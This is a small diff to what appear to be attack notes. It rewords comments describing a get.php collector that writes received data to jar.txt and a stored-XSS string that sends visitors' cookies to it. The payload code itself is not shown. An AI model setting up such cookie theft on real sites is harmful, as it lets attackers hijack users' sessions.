@@ -1,6 +1,6 @@
 ##########################################################################################################
 
-get.php file on web server to write to jar.txt
+get.php file on web server to write received data to jar.txt
 
 ##########################################################################################################
 ```
@@ -18,7 +18,7 @@ fwrite($fp);
 ```
 ##########################################################################################################
 
-php string to send to above php file
+php string to send cookies to above php file. using stored xss when a user visits site with this xss on it will send there cookie to above php code file
 
 ##########################################################################################################
 
